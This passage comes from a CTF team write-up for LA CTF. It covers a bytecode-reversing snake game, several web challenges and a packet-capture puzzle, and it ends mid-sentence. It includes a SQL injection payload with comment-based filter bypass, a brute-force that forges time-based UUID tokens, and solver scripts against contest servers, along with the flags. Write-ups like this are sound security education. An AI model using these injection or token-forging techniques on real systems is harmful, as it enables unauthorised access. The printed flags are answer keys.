6\\x04K\\rK\\x94\\x86\\x07K\\x0bK\\x19h\\x17h\\x94\\x86\\x12K\\x05Krh\\x94\\x86\\x02K\\x08K\\x14h\\xf4hDh\\x94\\x86\\x13K\\x12K\\x94\\x86\\rK\\x10K\\x94\\x86\\x05K\\x06K\\x94\\x86\\x0eK\\rK\\x11h\\xb5h\\x94\\x86\\x11K\\x00K\\x94\\x86\\x06K\\nK\\x08h\\x94\\x86\\x01K\\x0eK\\x8chbh5h(\\x94\\x91\\x94\\x86\\x08K\\x07K\\xe9h\\x94\\x86\\x0eK\\x10K0h\\xe8h\\xcch\\xcdh]h\\x94\\x86\\x04K\\nK,h\\xa8h~h\\xfch\\xc7h\u0026#34;h!h{hMh\\xf8h\\xc2h\\xc1h\\x94\\x86\\x0bK\\x01KthyhIh\\x94\\x86\\x11K\\x11K\\xa0h\\x16h\\x94\\x86\\x0fK\\x0cK\\x94\\x86\\x02K\\x04K\\x97h\\xb9h\\x94\\x86\\x11K\\rK\\x94\\x86\\x11K\\x02KAh\\x94\\x86\\x0bK\\x0fK\\x94\\x86\\x08K\\rK\\x11h\\x94\\x86\\tK\\x01K\\x94\\x86\\x04K\\x10K\u0026gt;h\\x94\\x86\\x02K\\rKhh\\x94\\x86\\x12K\\x13K\\xd6h;h\\nh\\xb0h\\x06hbh(\\x94\\x913h`h\\xbch\\xadh\\xach.hYh\\x94\\x86\\x04K\\x01K\\xe7h\\xa9h\\xc9h(h\\x94\\x86\\x04K\\x13K\\\u0026#39;hRhPh\\x94\\x86\\x13K\\x06K\\xe2h\\x94\\x86\\x0cK\\x10K\\x94\\x86\\rK\\rK\\x94\\x86\\x10K\\rK\\xe1h\\x94\\x86\\x13K\\x0bK\\xc2hxhJh\\x1bh\\x1ah\\x94\\x86\\x01K\\x0bKph\\x94\\x86\\x02K\\x13K\\xddh\\x94\\x86\\x0eK\\x04K\\x99hDhBh\\x94\\x86\\x0fK\\x01K\\x94\\x86\\x01K\\x12K\\x94\\x86\\x0bK\\rK\\xd6h\\x07h\\nh\\x94\\x86\\x13K\\x03K\\x91h\\x05h\\x94\\x86\\x00K\\x13K\\x94\\x86\\x07K\\x0eK\\x03h\\x94\\x86\\x07K\\x0cK\\x94\\x86\\x00K\\x04K(\\x94\\x91\\x94\\x86\\x12K\\x0fK\\x94\\x86\\x0bK\\x07K\\x94\\x86\\x06K\\x02KWh\\x94\\x86\\nK\\x13K\\x82h\\xaah\\x94\\x86\\x01K\\x01K\\x94\\x86\\x07K\\x08KShRh)h\u0026amp;h\\xc7h\\x94\\x86\\x02K\\x03K\\xa7h!h\\x94\\x86\\x10K\\x06K\\x94\\x86\\x13K\\x0fK{h\\xa5h\\xc4h\\x94\\x86\\x0eK\\x01K\\x94\\x86\\x11K\\nK\\x94\\x86\\nK\\x02K\\xc1huhth\\x1bh\\x94\\x86\\nK\\tK\\xa0h\\x94\\x86\\x0cK\\x03K\\xbdh\\x99h\\x94\\x86\\x06K\\x0cK\\x94\\x86\\x08K\\x0fK\\x94\\x86\\x0bK\\x00K\\x94\\x86\\x0bK\\x02K\\xb3h\\x94\\x86\\x12K\\x11K\\x94\\x86\\x03K\\nK\\x94\\x86\\x0eK\\tK\\xb1h\\x94\\x86\\x02K\\x0bK\\x0eh\\x94\\x86\\x06K\\x11Keh\\x94\\x86\\x02K\\tK\\x94\\x86\\x0cK\\x04K\\x8fh(\\x94\\x91\\x94\\x86\\x11K\\x10K\\x94\\x86\\x12K\\x0bK\\x94\\x86\\nK\\x01K/h\\x94\\x86\\x06K\\x0fK\\x94\\x86\\x12K\\tK\\x94\\x86\\x03K\\x02K\\x81h\\x94\\x86\\x00K\\rKXhVh\\xa8h\\x94\\x86\\x0eK\\x03K\\x94\\x86\\x0bK\\x03K\\x94\\x86\\x04K\\x11K\u0026#34;h\\x94\\x86\\x0bK\\x0cK!h\\x94\\x86\\nK\\x06K h\\x94\\x86\\x06K\\x10K\\x94\\x86\\rK\\x0fK\\x94\\x86\\x13K\\x00K\\x94\\x86\\rK\\x0bK\\x94\\x86\\x04K\\x00K\\x17h\\x94\\x86\\x07K\\tK\\x94\\x86\\x11K\\x04KGh\\x94\\x86\\x06K\\x03K\\x94\\x86\\x12K\\x00KBh\\x94\\x86\\rK\\x12Klh\\x94\\x86\\x08K\\x06K\\x94\\x86\\x0eK\\x0fK\\x94\\x86\\nK\\x10K\\x94\\x86\\x01K\\x07K\\x94\\x86\\x04K\\x07K\\x94\\x86\\x0fK\\nK\\x94h\\x94\\x86\\x08K\\x0bK\\x94\\x86\\x11K\\tK\\x94\\x86\\x02K\\x02K\\x94\\x86\\x08K\\tK\\nh\\x94\\x86\\x02K\\x00K\\x92hgh\\x94\\x86\\x00K\\x08K(\\x94\\x912h_h\\x89h\\x94\\x86\\x02K\\x07K\\x94\\x86\\x06K\\rK\\x86h\\x94\\x86\\x0cK\\x0bK\\x94\\x86\\x0cK\\tK\\x94\\x86\\x07K\\x13KUh*h\\x94\\x86\\x13K\\x04K\u0026amp;h%h\\x94\\x86\\x05K\\x0cK!h\\x94\\x86\\x06K\\x07Kzh\\x94\\x86\\nK\\x0fK\\x94\\x86\\x10K\\x02Kxh\\x94\\x86\\x08K\\nK\\x94\\x86\\x07K\\rKIh\\x94\\x86\\nK\\x00K\\x94\\x86\\x0bK\\x13K\\x18h\\x94\\x86\\x05K\\x13K\\x94\\x86\\x0fK\\x03K\\x94\\x86\\x12K\\x0cK\\x94\\x86\\x12K\\x03K\\x94\\x86\\x12K\\x0eK\\x94\\x86\\x03K\\x0eK\\x94\\x86\\x05K\\x04K\\x94\\x86\\x00K\\x03K\\x94\\x86\\rK\\x07Klh\\x94\\x86\\x11K\\x0bK\\x94\\x86\\x08K\\x02K\\x94\\x86\\x08K\\x00K\\x94\\x86\\x05K\\x00K\\x94\\x86\\x03K\\x13K\\x94\\x86\\x0fK\\x04K\\x05h\\x94\\x86\\x07K\\x05K\\x94\\x86\\x06K\\x04K\\x94\\x86\\x07K\\x03K\\x94\\x86\\nK\\x0cK\\x94\\x86\\x04K\\x0eK\\x03h(\\x94\\x91\\x94\\x86\\x0fK\\x0fK3h\\x94\\x86\\x02K\\x12K\\x94\\x86\\x13K\\nK\\x94\\x86\\x0fK\\x00K\\x94\\x86\\x0cK\\x00K\\x94\\x86\\x0fK\\tK\\x94\\x86\\x01K\\nK\\x94\\x86\\x07K\\nK\\x94\\x86\\tK\\x0bK\\x94\\x86\\x11K\\x05K\\x94\\x86\\x0eK\\x05K,h\\x94\\x86\\tK\\tK*h\\x94\\x86\\rK\\x04K\\x94\\x86\\x07K\\x11K\\x94\\x86\\x08K\\x0cK\\x94\\x86\\rK\\x06K\\x94\\x86\\tK\\x07K\\x94\\x86\\x11K\\x13K\\x94\\x86\\rK\\x00K\\x94\\x86\\x05K\\x01K\\x94\\x86\\x01K\\rK\\x94\\x86\\x04K\\x0fKJh\\x94\\x86\\x11K\\x08K\\x94\\x86\\x05K\\nK\\x94\\x86\\x05K\\x08K\\x18h\\x94\\x86\\x0eK\\x11K\\x94\\x86\\x01K\\tKFh\\x13h\\x94\\x86\\x02K\\x11K\\x94\\x86\\x00K\\x0eK\\x94\\x86\\x11K\\x06K\\x94\\x86\\x11K\\x0fK\\x94\\x86\\x10K\\x10K\\x94\\x86\\x02K\\x06K\\x94\\x86\\x0cK\\x01K\\x94\\x86\\x12K\\x08K\\x0fh8h\\x94\\x86\\rK\\x05K\\x94\\x86\\x10K\\x03K\\x94\\x86\\nK\\x03K\\x94\\x86\\x01K\\x03K\\x94\\x86\\x11K\\x12K\\x94\\x86\\x11K\\x07K(\\x94\\x91\\x94\\x86\\x03K\\x06K\\x94\\x86\\x0fK\\rK\\x94\\x86\\tK\\x0fK\\x94\\x86\\x03K\\rK\\x94\\x86\\x00K\\x0fK\\x94\\x86\\x10K\\nK\\x94\\x86\\tK\\x02K\\x94\\x86\\rK\\x08K\\x94\\x86\\x13K\\x11K\\x94\\x86\\x00K\\x02K\\x94\\x86\\x03K\\x00K\\x94\\x86\\x10K\\x11K\\x94\\x86\\nK\\x11K\\x94\\x86\\x11K\\x03K\\x94\\x86\\x08K\\x03K\\x94\\x86\\x11K\\x0cK\\x94\\x86\\x02K\\x05K\\x94\\x86\\x02K\\x0eK\\x94\\x86\\x06K\\x12K\\x94\\x86\\x07K\\x06K\\x94\\x86\\rK\\x02K\\x94\\x86\\x13K\\tK\\x94\\x86\\x07K\\x02K\\x94\\x86\\nK\\x0bK\\x1ah\\x94\\x86\\x0fK\\x05K\\x16h\\x94\\x86\\x0bK\\x11K\\x94\\x86\\x03K\\x05K\\x94\\x86\\tK\\x03K\\x13h\\x94\\x86\\x06K\\x0eK\\x94\\x86\\x0bK\\x12K\\x94\\x86\\x03K\\x0cK\\x94\\x86\\x12K\\x01K\\x94\\x86\\x0fK\\x08K\\x94\\x86\\x05K\\x02K\\x94\\x86\\x0bK\\tK\\rh\\x94\\x86\\x05K\\x0bK\\x07h\\x0ch\\x94\\x86\\nK\\x05K\\x94\\x86\\rK\\x0eK\\x94\\x86\\tK\\x11K\\x94\\x86\\x03K\\x11K\\x94\\x86\\x01K\\x05K\\x94\\x86\\x10K\\x01K\\x94\\x86\\x0fK\\x06K\\x94\\x86\\x12K\\x06K(\\x94\\x91\\x94\\x86\\x0bK\\x10K\\x94\\x86\\x0cK\\x0fK\\x94\\x86\\x05K\\x12K\\x94\\x86\\x0fK\\x02K\\x94\\x86\\rK\\x01K\\x94\\x86\\x02K\\x10K\\x94\\x86\\x06K\\x00K\\x94\\x86\\x11K\\x0eK\\x94\\x86\\x00K\\x0bK\\x94\\x86\\x01K\\x13K\\x94\\x86\\x01K\\x11K\\x94\\x86\\x04K\\x08K\\x94\\x86\\x05K\\x05K\\x94\\x86\\x10K\\x04K\\x94\\x86\\x04K\\x04K\\x94\\x86\\x01K\\x04K\\x94\\x86\\x07K\\x04K\\x94\\x86\\x12K\\x07K\\x94\\x86\\x12K\\x10K\\x94\\x86\\x0cK\\x12K\\x94\\x86\\x03K\\x10K\\x94\\x86\\x10K\\x0bK\\x94\\x86\\x10K\\x00K\\x94\\x86\\x10K\\tK\\x94\\x86\\x0eK\\x13K\\x94\\x86\\x0eK\\x08K\\x94\\x86\\x08K\\x13K\\x94\\x86\\x0bK\\x08K\\x94\\x86\\x0cK\\x05K\\x94\\x86\\x0bK\\x04K\\x94\\x86\\x0cK\\x0eK\\x94\\x86\\x05K\\x11K\\x94\\x86\\tK\\x0eK\\x94\\x86\\x07K\\x07K\\x94\\x86\\x07K\\x10K\\x94\\x86\\x03K\\x01K\\x94\\x86\\x03K\\x08K\\x94\\x86\\x0cK\\x11K\\x94\\x86\\tK\\nK\\x94\\x86\\tK\\x08K\\x94\\x86\\x06K\\x08K\\x94\\x86\\x00K\\nK\\x94\\x86\\tK\\x13K\\x94\\x86\\x10K\\x05K\\x94\\x86\\x13K\\x0eK\\x94\\x86\\x05K\\tK\\x94\\x86\\x06K\\x13K\\x94\\x86\\tK\\x04K\\x94\\x86\\x04K\\x03K\\x94\\x86\\x0cK\\x06K(\\x01\\xc5\\xcf\\x1c\\xc5\\x86Y*\\x81Q\\xc3\\xc3\\xa5\\r\\x8a\\x14K\\x94\\x85\\x94euqed\\x05\\x8c\\x00KN(\\x00\\x00\\x00\\x00\\x00\\x00\\tv\\x95\\x04\\x80\u0026#39; varname_tuple = (\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;j\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;u\u0026#39;) symbols_tuple = (\u0026#34;pickle\u0026#34;, \u0026#34;encode_long\u0026#34;, \u0026#34;__code__\u0026#34;, \u0026#34;time\u0026#34;, \u0026#34;collections\u0026#34;, \u0026#34;deque\u0026#34;, \u0026#34;range\u0026#34;, \u0026#34;print\u0026#34;, \u0026#34;len\u0026#34;, \u0026#34;popleft\u0026#34;, \u0026#34;isinstance\u0026#34;, \u0026#34;int\u0026#34;, \u0026#34;isdigit\u0026#34;, \u0026#34;appendleft\u0026#34;, \u0026#34;append\u0026#34;, \u0026#34;open\u0026#34;, \u0026#34;read\u0026#34;, \u0026#34;strip\u0026#34;, \u0026#34;pop\u0026#34;, \u0026#34;sleep\u0026#34;, \u0026#34;extend\u0026#34;, \u0026#34;input\u0026#34;, \u0026#34;split\u0026#34;) constants = __import__(\u0026#34;pickle\u0026#34;).loads(__import__(\u0026#34;builtins\u0026#34;).bytes(__import__(\u0026#34;builtins\u0026#34;).reversed(binbytes2))) bytecode = __import__(\u0026#34;builtins\u0026#34;).bytes(__import__(\u0026#34;builtins\u0026#34;).map(__import__(\u0026#34;functools\u0026#34;).partial(__import__(\u0026#34;operator\u0026#34;).and_, 255), __import__(\u0026#34;itertools\u0026#34;).starmap(__import__(\u0026#34;operator\u0026#34;).xor, __import__(\u0026#34;builtins\u0026#34;).enumerate(binbytes)))) code_object = types.CodeType(0, 0, 0, 21, 11, 67, bytecode, constants, symbols_tuple, varname_tuple, \u0026#34;snek\u0026#34;, \u0026#34;snek\u0026#34;, 1337, b\u0026#34;snek\u0026#34;) pyc_data = importlib._bootstrap_external._code_to_timestamp_pyc(code_object) with open(\u0026#34;snek.pyc\u0026#34;, \u0026#34;wb\u0026#34;) as f: _ = f.write(pyc_data) Then, use unpyc37-3.10 to decompile the PYC file. I got decompiled code that looks like this:\nimport pickle as a a.encode_long.__code__ = a.encode_long.__code__ import time as b from collections import deque as c d = 20 e = 140447092963680462851258172325 frozenset({(6, 12), (3, 4), (4, 9), (19, 6), (9, 5), (8, 3), (19, 9), (5, 16), (8, 9), (8, 6), (10, 0), (10, 9), (14, 19), (17, 12), (1, 3), (16, 7), (7, 7), (14, 9), (14, 12), (17, 5), (4, 11), (5, 12), (8, 11), (9, 16), (8, 14), (19, 8), (19, 14), (11, 16), (0, 16), (16, 3), (18, 12), (16, 18), (4, 1), (4, 7), (7, 18), (4, 4), (4, 16), (5, 5), (8, 4), (17, 1), (11, 0), (14, 17), (19, 1), (0, 6), (16, 2), (1, 13), (2, 15), (18, 5), (15, 12), (16, 11)}) frozenset({(6, 18), (6, 15), (1, 16), (17, 3), (17, 9), (5, 1), (14, 13), (5, 10), (8, 9), (14, 19), (11, 5), (10, 9), (9, 11), (8, 15), (2, 5), (1, 18), (12, 3), (14, 6), (3, 9), (14, 9), (5, 3), (17, 11), (4, 11), (5, 15), (8, 14), (9, 19), (2, 7), (11, 10), (2, 13), (6, 7), (18, 6), (6, 3), (14, 2), (5, 2), (12, 17), (3, 8), (17, 10), (3, 17), (17, 16), (0, 3), (2, 0), (17, 19), (8, 13), (2, 9), (10, 16), (13, 3), (15, 0), (15, 9), (13, 15), (18, 11)}) frozenset({(18, 17), (7, 17), (3, 1), (3, 10), (3, 16), (5, 1), (5, 13), (8, 3), (8, 18), (1, 12), (6, 2), (16, 16), (15, 17), (6, 17), (14, 0), (17, 2), (14, 9), (5, 3), (9, 1), (17, 14), (8, 5), (8, 11), (10, 5), (2, 7), (1, 5), (8, 17), (0, 13), (13, 1), (15, 4), (19, 17), (7, 9), (6, 13), (12, 8), (17, 7), (4, 13), (9, 9), (5, 14), (14, 17), (19, 1), (10, 1), (10, 7), (5, 17), (9, 15), (0, 12), (11, 9), (0, 15), (10, 19), (18, 2), (16, 11), (15, 15)}) frozenset({(3, 4), (14, 4), (12, 10), (3, 7), (4, 6), (5, 7), (19, 6), (4, 15), (19, 3), (0, 5), (0, 8), (11, 17), (2, 8), (15, 17), (7, 13), (3, 0), (4, 5), (14, 3), (14, 18), (3, 18), (12, 18), (3, 15), (19, 5), (8, 11), (19, 11), (0, 10), (10, 8), (13, 7), (11, 10), (0, 13), (2, 16), (7, 9), (15, 10), (7, 6), (16, 18), (12, 5), (4, 4), (4, 16), (4, 19), (19, 1), (17, 16), (19, 7), (9, 12), (11, 12), (0, 12), (13, 6), (7, 2), (18, 2), (13, 15), (15, 12)}) frozenset({(8, 0), (5, 13), (0, 2), (10, 0), (19, 3), (9, 8), (2, 2), (11, 8), (0, 8), (9, 17), (10, 15), (7, 4), (7, 1), (16, 10), (15, 14), (6, 8), (15, 17), (18, 13), (12, 3), (0, 18), (3, 6), (17, 11), (4, 17), (9, 7), (5, 12), (0, 4), (11, 13), (0, 19), (15, 13), (16, 6), (18, 12), (6, 10), (16, 18), (12, 11), (7, 18), (3, 11), (17, 4), (3, 14), (4, 19), (0, 3), (5, 17), (13, 0), (17, 19), (2, 3), (1, 13), (9, 18), (15, 6), (1, 10), (11, 18), (16, 17)}) frozenset({(4, 6), (4, 12), (9, 2), (3, 10), (17, 6), (11, 2), (17, 12), (9, 8), (9, 14), (10, 3), (9, 17), (17, 18), (2, 11), (0, 11), (15, 8), (12, 6), (4, 5), (3, 6), (3, 12), (19, 11), (9, 10), (19, 14), (8, 17), (15, 4), (11, 13), (2, 10), (10, 17), (1, 14), (16, 6), (15, 10), (6, 13), (15, 19), (6, 16), (16, 18), (12, 5), (3, 2), (17, 4), (3, 8), (4, 16), (17, 1), (3, 17), (8, 7), (1, 1), (9, 12), (2, 0), (11, 9), (19, 10), (2, 6), (7, 11), (15, 18)}) frozenset({(4, 0), (12, 7), (3, 4), (14, 7), (19, 0), (19, 6), (4, 15), (3, 19), (10, 0), (14, 19), (9, 14), (13, 11), (18, 1), (1, 15), (12, 3), (14, 6), (4, 5), (4, 14), (3, 12), (19, 2), (9, 1), (11, 1), (8, 14), (19, 14), (2, 7), (0, 13), (11, 19), (0, 19), (1, 14), (13, 16), (13, 13), (16, 12), (15, 19), (6, 19), (5, 2), (3, 8), (3, 14), (5, 5), (8, 4), (19, 4), (19, 7), (19, 10), (1, 4), (8, 13), (16, 2), (13, 6), (7, 2), (0, 18), (6, 3), (16, 11)}) frozenset({(7, 17), (9, 5), (0, 2), (10, 0), (14, 13), (9, 14), (13, 2), (19, 18), (8, 18), (9, 11), (16, 4), (1, 9), (13, 8), (16, 7), (1, 18), (15, 11), (2, 17), (13, 17), (15, 14), (7, 13), (4, 2), (12, 15), (4, 11), (19, 11), (17, 17), (11, 10), (8, 17), (19, 17), (1, 11), (11, 13), (0, 19), (13, 16), (6, 7), (6, 13), (16, 18), (7, 18), (17, 4), (19, 4), (4, 13), (4, 19), (14, 17), (10, 4), (13, 3), (9, 18), (2, 6), (15, 6), (2, 15), (16, 14), (7, 11), (7, 8)}) frozenset({(6, 18), (7, 17), (14, 4), (14, 1), (5, 16), (10, 6), (0, 17), (10, 15), (13, 14), (16, 7), (6, 5), (16, 13), (18, 19), (14, 6), (4, 14), (17, 5), (8, 2), (5, 12), (5, 18), (8, 5), (11, 7), (19, 8), (13, 4), (0, 16), (18, 5), (13, 10), (15, 7), (18, 0), (16, 6), (16, 12), (15, 10), (6, 13), (16, 15), (15, 19), (16, 18), (12, 11), (14, 2), (9, 0), (17, 7), (19, 7), (17, 13), (0, 9), (5, 17), (15, 0), (2, 6), (16, 5), (1, 10), (7, 5), (16, 17), (7, 14)}) frozenset({(12, 7), (3, 1), (12, 19), (3, 10), (9, 5), (3, 19), (8, 3), (10, 0), (17, 6), (9, 14), (5, 19), (10, 3), (17, 18), (11, 14), (2, 11), (2, 8), (15, 11), (16, 16), (6, 14), (3, 0), (3, 3), (5, 6), (3, 12), (17, 5), (4, 17), (0, 7), (2, 4), (8, 8), (9, 16), (13, 1), (1, 11), (2, 10), (6, 4), (18, 3), (6, 16), (7, 15), (7, 18), (4, 10), (5, 5), (4, 13), (3, 17), (0, 9), (5, 17), (9, 15), (8, 19), (1, 7), (16, 5), (7, 2), (6, 6), (13, 15)}) f = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}] g = c([(0, 0)]) h = (1, 0) i = 0 j = c([]) k = [] l = \u0026#39;\u0026#39; for m in range(d): n = \u0026#39;\u0026#39; for o in range(d): if (m, o) in g: n += \u0026#39;#\u0026#39; elif (m, o) in (f[i]): n += \u0026#39;o\u0026#39; else: n += \u0026#39;.\u0026#39; l += n + \u0026#39;\\n\u0026#39; print(l, flush=True) if len(j) \u0026gt; 0: p = j.popleft() if isinstance(p, int) or p.isdigit(): p = int(p) p -= 1 if p \u0026gt; 0: j.appendleft(p) q = g[0] r = (q[0] + h[0], q[1] + h[1]) if r[0] \u0026lt; 0 or (r[0] \u0026gt;= d or r[1] \u0026lt; 0) or r[1] \u0026gt;= d: print(\u0026#39;snek dead :(\u0026#39;) return g.appendleft(r) if r in (f[i]): i += 1 k.append(r) if i == len(f): s = 0 for (t, u) in k: s ^= 1337 s *= d**(2) s += t*d + u if e == s: print(\u0026#39;snek happy :D\u0026#39;) print(open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;).read().strip()) return print(\u0026#39;snek sad :(\u0026#39;) return else: g.pop() elif p == \u0026#39;L\u0026#39;: h = (-h[1], h[0]) elif p == \u0026#39;R\u0026#39;: h = (h[1], -h[0]) else: print(\u0026#39;snek confused :(\u0026#39;) return else: j.extend(input(\u0026#39;snek? \u0026#39;).strip().split()) While the logic shown in the script is not entirely correct and sensible, you can deduce what is happening and how the flag could be reached:\n Each map is stored as a frozenset that has orb coordinates. Each time an orb gets collected, its coordinates are stored in an array called k. After an orb is collected from each map, each coordinate in k is used to calculate a checksum s. If s is equal to 140447092963680462851258172325, the flag gets printed.  Now the objective of the game is clear: Collect specific orbs such that the target checksum is reached.\nDetermine the coordinates of the orbs to collect for each map:\nchecksum = 140447092963680462851258172325 coords = [] for i in range(10): rem = checksum % 400 checksum -= rem checksum //= 400 checksum ^= 1337 col = rem % 20 rem -= col row = rem // 20 coords.append((row, col)) coords = coords[::-1] for coord in coords: print(coord) Then, determine the correct movements for each map such that the target orbs are collected. I did this manually, which took around 20 minutes.\nFinally\u0026hellip; solve it.\nfrom pwn import * inputs = [\u0026#34;9\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;15\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;16\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;10\u0026#34;] s = remote(\u0026#34;lac.tf\u0026#34;, 31133) for ans in inputs: _ = s.recvuntil(b\u0026#34;snek? \u0026#34;) _ = s.sendline(ans.encode()) _ = s.recvuntil(b\u0026#34;snek happy :D\\n\u0026#34;) flag = s.recv().decode().strip() print(flag) s.close() Flag: lactf{h4h4_sn3k_g0_brrrrrrrr}\n(Postmortem thoughts: I didn\u0026rsquo;t pay enough attention to the outputted script to notice that the user input gets splitted. This means I could\u0026rsquo;ve just separated each input with a single space and sent them all at once\u0026hellip;)\nWeb (9/9 solved) college-tour (756 solves) Solved by J4cky\nhttps://college-tour.lac.tf/\nFirst, check the source code of the web page. Get the 3 parts of the flag:\nlactf{1_j03_4} lactf{2_nd_j0} lactf{4_n3_bR} Next, check the index.css.\nlactf{3_S3phI}\nThen, check the script.js. lactf{5_U1n_s} lactf{6_AY_hi} Finally, put the different parts together and get the flag.\nFlag: lactf{j03_4nd_j0S3phIn3_bRU1n_sAY_hi}\nuuid hell (165 solves) Solved by RaccoonNinja and fsharp; written by RaccoonNinja\nv1 UUIDs are time-based and not really secure.\nThe fastest way to solve it is to do these in burp repeater:\n get user UUID generate admin UUID get user UUID again, confirm only 1 admin UUID is generated by comparing the 2 admin lists recorded in logger  The search range can be greatly reduced if we appreciate that nsec is 0, cracking md5 takes no time as well.\nimport hashlib def uuid_to_time(x): a,b,c,d,e = x.split(\u0026#34;-\u0026#34;) return int(c[1:]+b+a, 16)//10000 def time_to_uuid(t): info = hex(int(t)*10000)[2:] return f\u0026#34;{info[-8:]}-{info[3:7]}-1{info[:3]}-aa64-67696e6b6f69\u0026#34; start = uuid_to_time(\u0026#34;7b9d8fe0-a9e2-11ed-aa64-67696e6b6f69\u0026#34;) end = uuid_to_time(\u0026#34;7c4393e0-a9e2-11ed-aa64-67696e6b6f69\u0026#34;) h = \u0026#34;94413ca27101391a61b8a3173efd4fad\u0026#34; for i in range(start,end+10000): m = hashlib.new(\u0026#39;md5\u0026#39;) m.update(f\u0026#34;admin{time_to_uuid(i)}\u0026#34;.encode()) digest = m.hexdigest() if digest == h: print(time_to_uuid(i), digest) break lactf{uu1d_v3rs10n_1ch1_1s_n07_r4dn0m}\nmy-chemical-romance (104 solves) Solved by fsharp\nThere are only two pages in the website: The main page and another page that shows up when the URL being requested isn\u0026rsquo;t found.\nLooking closer, there\u0026rsquo;s a response header called Source-Control-Management-Type: Mercurial-SCM by accessing the main page. Mercurial SCM is a version control system for software developers, just like Git and Subversion.\nPerhaps the source code or version history of the website could be downloaded? After installing TortoiseHg, clone the website directly by running hg clone --verbose https://my-chemical-romance.lac.tf \u0026lt;directory\u0026gt; and open up gerard_way2001.py to find the flag hidden in a previous version.\nFlag: lactf{d0nT_6r1nk_m3rCur1al_fr0m_8_f1aSk}\n85_reasons_why (78 solves) Solved by RaccoonNinja\nhttps://85-reasons-why.lac.tf/\nWe\u0026rsquo;re given a blog, specifically the query by image function does these:\n encode the image with base85 escape single quotes but \\\\\\' gets encoded to ' (note ~ is not a valid character in base85)  When combined with the fact that /**/ can be used in place of space in sqlite, the problem can be solved quickly:\nimport re, base64 sql = \u0026#34;\u0026#39;OR 1=1 OR \u0026#39;a\u0026#39;=\u0026#39;a\u0026#34; print(\u0026#34;where b85_image = \u0026#39;{}\u0026#39; AND ((select active from posts where id=PID) = TRUE)\u0026#34;.format(sql)) sql = sql.replace(\u0026#34; \u0026#34;, \u0026#34;/**/\u0026#34;) sql = sql.replace(\u0026#34;\u0026#39;\u0026#34;, \u0026#34;\\\\\\\\\\\\\\\u0026#39;\u0026#34;) def serialize_image(b85_string): # identify single quotes, and then escape them b85_string = re.sub(\u0026#39;\\\\\\\\\\\\\\\\\\\\\\\\\\\u0026#39;\u0026#39;, \u0026#39;~\u0026#39;, b85_string) b85_string = re.sub(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\\\u0026#39;\\\u0026#39;\u0026#39;, b85_string) b85_string = re.sub(\u0026#39;~\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, b85_string) b85_string = re.sub(\u0026#39;\\\\:\u0026#39;, \u0026#39;~\u0026#39;, b85_string) return b85_string print(\u0026#34;where b85_image = \u0026#39;{}\u0026#39; AND ((select active from posts where id=PID) = TRUE)\u0026#34;.format(serialize_image(sql))) def deserialize_image(b85): ret = b85 ret = re.sub(\u0026#39;~\u0026#39;, \u0026#39;:\u0026#39;, b85) raw_image = base64.a85decode(ret) with open(\u0026#34;solve.png\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(raw_image) print(\u0026#34;done, try your luck\u0026#34;) deserialize_image(sql) Submit the image and profit.\nlactf{sixty_four_is_greater_than_eigthy_five_a434d1c0e0425c3f}\nMisc (11/11 solved) EBE (426 solves) Solved by fsharp\nThe packet capture consists entirely of UDP packets, each containing only 1 byte of payload. However, viewing all of them together only shows a jumbled bunch of characters. What\u0026rsquo;s going on?\nOpening up the dissection of each packet, I noticed that the IPv4 header checksums were not validated, and that there were only two values: 0xe4c0 and 0x64c1. I filtered for packets that have the latter checksum with ip.checksum == 0x64c1, exported them to another file, and followed the newly constructed UDP stream to get the flag.\nIt wasn\u0026rsquo;t until after the CTF ended that I realized the challenge wasn\u0026rsquo;t about looking at header checksums, but was instead about the evil bit in IPv4 headers\u0026hellip;\nFlag: lactf{3V1L_817_3xf1l7R4710N_4_7H3_W1N_51D43c8000034d0c}\nhidden in plain sheets (251 solves) Solved by J4cky, LifeIsHard and RaccoonNinja; written by RaccoonNinja\nWe need to gain info to content in a hidden sheet called flag.\nI severely overthought the problem, looking at various http requests and trying to poke at it. The keypoint is that hidden sheets/regions are only cosmetic and not secure at all.\nWe can simply use the Find function and it will gladly find in the flag sheet for us. We can search with regex . in the flag sheet and recover 